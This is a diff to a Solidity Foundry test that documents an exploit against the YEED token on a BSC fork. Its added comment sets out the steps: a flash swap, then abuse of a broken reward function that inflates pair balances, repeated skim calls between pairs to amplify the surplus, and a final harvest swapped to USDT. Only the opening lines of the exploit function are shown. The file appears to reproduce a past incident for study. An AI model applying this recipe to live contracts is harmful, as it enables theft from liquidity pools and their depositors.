@@ -18,6 +18,25 @@ contract ContractTest is Test {
         cheats.createSelectFork("http://127.0.0.1:8546", 17_132_514); // fork bsc at block 17132514
     }
 
+    // VULNERABILITY: Phantom YEED balance inflation via broken _takeReward + permissionless skim on affected pairs
+    // (See full analysis in sources/YEED_e7748f/YEED.sol near _takeReward)
+    // The exploit abuses:
+    // - YEED _isSwapPair list (swapPair, swapPairZeed, swapPairHo) receive full rewardFee added to _balances on every sell-to-pair
+    // - Triple-add bug + no reserve sync => balanceOf(pair) >> reserves => skim extracts
+    // - Skim-to-pair re-triggers fee logic (amplification)
+    // EXPLOIT STEPS:
+    // 1. Fork at block ~17132514 (pre-attack state).
+    // 2. Approve router for YEED.
+    // 3. Flash-swap borrow almost all YEED from usdtYeedHoSwapPair (the callback receives amount1 YEED).
+    // 4. In pancakeCall: yeed.transfer(usdtYeedPair, amount1) -- this hits isSwapPair(to) => _transferSell => _takeReward, injecting phantom YEED into all 3 pairs.
+    // 5. 10-iteration round-robin: usdtYeedPair.skim(hoYeedPair); hoYeedPair.skim(zeedYeedPair); zeedYeedPair.skim(usdtYeedPair);
+    //    Each inter-pair skim transfer re-triggers _takeReward (because dest is _isSwapPair), compounding the phantom YEED surplus across the cycle.
+    // 6. Final skims to self: usdtYeedPair.skim(this); hoYeedPair.skim(this); zeedYeedPair.skim(this); -- harvests the amplified excess YEED (now balance matches after skim).
+    // 7. Repay flash loan: yeed.transfer(flashPair, amount1*1000/997) using some of the harvested YEED.
+    // 8. Swap remaining YEED profit via router: YEED -> HO (via hoYeedPair token) -> USDT (via usdtYeedPair token0), send to msg.sender.
+    // 9. Log balances before/after showing USDT profit.
+    // Why no capital needed up-front: flash loan seeds the first sell; skimmed surplus covers repayment + profit.
+    // The usdtYeedHoSwapPair is just a convenient flash source for YEED (not one of the dividend pairs).
     function testExploit() public {
         yeed.approve(address(pancakeRouter), type(uint256).max);
         (uint112 _reserve0, uint112 _reserve1,) = usdtYeedHoSwapPair.getReserves();
